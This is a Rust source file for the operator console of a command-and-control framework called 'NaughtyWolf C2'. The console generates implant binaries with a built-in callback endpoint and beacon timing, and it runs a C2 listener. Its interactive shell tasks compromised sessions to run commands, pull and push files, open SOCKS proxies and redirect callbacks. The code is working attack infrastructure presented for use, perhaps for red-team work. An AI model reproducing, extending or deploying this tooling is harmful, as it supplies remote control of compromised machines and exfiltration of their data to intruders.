mod generate;

use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use clap::{Parser, Subcommand};
use nw_server::{
    Dispatcher, ServerConfig,
    dispatch::Outcome,
    operators::{Operator, OperatorStore},
    server,
};
use tokio::sync::mpsc;
use uuid::Uuid;

/// NaughtyWolf C2 operator console.
#[derive(Parser)]
#[command(name = "nw-console", version, about = "C2 operator console")]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Run the interactive operator console (default).
    Console {
        /// Operator username for headless auth.
        #[arg(long)]
        operator: Option<String>,
        /// Operator password (use with --operator).
        #[arg(long)]
        password: Option<String>,
    },
    /// Generate a compiled implant binary with callback baked in.
    Generate {
        /// C2 callback endpoint (e.g. https://c2:8081).
        #[arg(long)]
        endpoint: String,
        /// PSK shared with the server.
        #[arg(long)]
        psk: String,
        /// Output path for the compiled binary.
        #[arg(short, long)]
        output: PathBuf,
        /// Beacon interval in milliseconds.
        #[arg(long, default_value_t = 5000)]
        interval_ms: u64,
        /// Beacon jitter in milliseconds.
        #[arg(long, default_value_t = 1000)]
        jitter_ms: u64,
    },
}

fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();
    tracing_subscriber::fmt()
        .with_env_filter(tracing_subscriber::EnvFilter::from_env("NW_LOG"))
        .init();

    let config = ServerConfig::from_env();

    match cli.command {
        Some(Commands::Generate {
            endpoint,
            psk,
            output,
            interval_ms,
            jitter_ms,
        }) => {
            return generate::run(&endpoint, &psk, &output, interval_ms, jitter_ms);
        }
        Some(Commands::Console {
            operator: op_name,
            password: op_pass,
        }) => {
            run_console(config, op_name.as_deref(), op_pass.as_deref())?;
        }
        None => {
            run_console(config, None, None)?;
        }
    }
    Ok(())
}

fn run_console(
    config: ServerConfig,
    operator: Option<&str>,
    password: Option<&str>,
) -> anyhow::Result<()> {
    let bind = config.bind.clone();

    let rt = tokio::runtime::Runtime::new()?;

    // Sessions, tasks, operators, and audit share one SQLite pool.
    let (state, operator_pool) = rt.block_on(server::build_state_with_pool(&config))?;
    let operator_store = OperatorStore::new(operator_pool.clone());
    bootstrap_admin(
        &rt,
        &operator_store,
        config.admin_password.as_deref(),
        operator,
        password,
    )?;

    let current_operator = match (operator, password) {
        (Some(user), Some(pass)) => match rt.block_on(operator_store.authenticate(user, pass)) {
            Some(op) => op,
            None => {
                eprintln!("authentication failed for {user}");
                return Ok(());
            }
        },
        _ => {
            // Interactive login prompt
            match login_prompt(&rt, &operator_store) {
                Some(op) => op,
                None => return Ok(()),
            }
        }
    };

    tracing::info!(operator = %current_operator.username, role = %current_operator.role, "operator authenticated");

    // C2 listener runs in the background.
    let listener_state = state.clone();
    rt.spawn(async move { server::serve(listener_state, &bind).await });

    let audit = Arc::new(nw_server::audit_log::AuditLog::new(operator_pool.clone()));
    let dispatcher = Dispatcher::new(
        state.registry.clone(),
        state.queue.clone(),
        state.uploads.clone(),
        current_operator.clone(),
    )
    .with_audit(audit);
    rt.block_on(repl(dispatcher, &current_operator))?;
    Ok(())
}

fn bootstrap_admin(
    rt: &tokio::runtime::Runtime,
    store: &OperatorStore,
    configured_password: Option<&str>,
    login_user: Option<&str>,
    login_password: Option<&str>,
) -> anyhow::Result<()> {
    if !rt.block_on(store.is_empty()).map_err(anyhow::Error::msg)? {
        return Ok(());
    }

    let password = match configured_password {
        Some(password) => password.to_owned(),
        None if login_user == Some("admin") => {
            login_password.map(str::to_owned).ok_or_else(|| {
                anyhow::anyhow!("empty operator database: provide --password or NW_ADMIN_PASSWORD")
            })?
        }
        None if login_user.is_none() => {
            eprintln!("No operators exist. Create the initial admin account.");
            let first = rpassword::prompt_password("new admin password: ")?;
            let second = rpassword::prompt_password("confirm admin password: ")?;
            if first != second {
                anyhow::bail!("admin password confirmation did not match");
            }
            first
        }
        None => anyhow::bail!(
            "empty operator database: set NW_ADMIN_PASSWORD or bootstrap with --operator admin"
        ),
    };
    if password.len() < 12 {
        anyhow::bail!("initial admin password must contain at least 12 characters");
    }
    rt.block_on(store.seed_default_admin(&password))
        .map_err(anyhow::Error::msg)
}

fn login_prompt(rt: &tokio::runtime::Runtime, store: &OperatorStore) -> Option<Operator> {
    loop {
        eprintln!("NaughtyWolf C2 — operator login");
        let username = prompt("username: ");
        let password = rpassword::prompt_password("password: ").ok()?;
        match rt.block_on(store.authenticate(&username, &password)) {
            Some(op) => return Some(op),
            None => {
                eprintln!("invalid credentials, try again (or Ctrl-C to abort)");
            }
        }
    }
}

fn prompt(label: &str) -> String {
    use std::io::Write;
    print!("{}", label);
    std::io::stderr().flush().ok();
    let mut line = String::new();
    std::io::stdin().read_line(&mut line).ok();
    line.trim().to_string()
}

async fn repl(dispatcher: Dispatcher, operator: &Operator) -> anyhow::Result<()> {
    println!(
        "NaughtyWolf C2 console — operator {} ({}). Type 'help' for commands.",
        operator.username, operator.role
    );
    let (tx, mut rx) = mpsc::channel::<String>(64);
    std::thread::spawn(move || {
        let stdin = std::io::stdin();
        loop {
            let mut line = String::new();
            match stdin.read_line(&mut line) {
                Ok(0) | Err(_) => break,
                Ok(_) => {
                    if tx.blocking_send(line).is_err() {
                        break;
                    }
                }
            }
        }
    });

    while let Some(line) = rx.recv().await {
        let line = line.trim();
        if line == "exit" || line == "quit" {
            break;
        }
        if line.is_empty() {
            continue;
        }
        if line == "help" {
            print_help();
            continue;
        }
        match dispatcher.parse(line).await {
            Outcome::Local { message } => {
                if !message.is_empty() {
                    println!("{}", message);
                }
            }
            Outcome::TaskQueued {
                session,
                task_id,
                role,
            } => {
                debug_assert_eq!(role, operator.role);
                println!("queued {} to {}", task_id, session);
                wait_result(&dispatcher, &session, &task_id).await;
            }
            Outcome::Error(e) => eprintln!("error: {}", e),
        }
    }
    Ok(())
}

/// Poll the queue until the task result arrives (or a time budget elapses).
async fn wait_result(dispatcher: &Dispatcher, session: &Uuid, task_id: &Uuid) {
    let mut waited = Duration::ZERO;
    let budget = Duration::from_secs(30);
    while waited < budget {
        if let Some(r) = dispatcher.queue.take_result(session, task_id).await {
            let out = String::from_utf8_lossy(&r.stdout).to_string();
            let err = String::from_utf8_lossy(&r.stderr).to_string();
            println!("[exit {}] {}", r.exit_code, out);
            if !err.is_empty() {
                eprintln!("[stderr] {}", err);
            }
            return;
        }
        tokio::time::sleep(Duration::from_millis(250)).await;
        waited += Duration::from_millis(250);
    }
    eprintln!("timed out waiting for task {}", task_id);
}

fn print_help() {
    println!(
        "commands:\n\
         \x20 sessions                  list registered sessions\n\
         \x20 interact <session-id>     focus a session\n\
         \x20 shell <cmd> [args...]     run a command on the focused session\n\
         \x20 download <path>           stream a remote file to the downloads dir\n\
         \x20 upload <local> <dest>     push a local file to the focused session\n\
         \x20 hashes <path>              compute SHA-256 of a file on the focused session\n\
         \x20 socks <port>              start a SOCKS5 proxy on the focused session\n\
         \x20 jobs                     list task statuses for the focused session\n\
         \x20 killjob <task-uuid>       cancel a queued or in-flight task\n\
         \x20 redirect <host>            change the focused session callback host\n\
         \x20 kill <session-id>         drop a session\n\
         \x20 exit                      quit"
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn configured_password_bootstraps_initial_admin() {
        let runtime = tokio::runtime::Runtime::new().unwrap();
        let pool = runtime
            .block_on(nw_server::persist::open_pool(":memory:"))
            .unwrap();
        let store = OperatorStore::new(pool);

        bootstrap_admin(&runtime, &store, Some("long-admin-password"), None, None).unwrap();

        assert!(
            runtime
                .block_on(store.authenticate("admin", "long-admin-password"))
                .is_some()
        );
    }

    #[test]
    fn weak_initial_admin_password_is_rejected() {
        let runtime = tokio::runtime::Runtime::new().unwrap();
        let pool = runtime
            .block_on(nw_server::persist::open_pool(":memory:"))
            .unwrap();
        let store = OperatorStore::new(pool);

        let error = bootstrap_admin(&runtime, &store, Some("short"), None, None)
            .unwrap_err()
            .to_string();
        assert!(error.contains("at least 12"));
    }
}
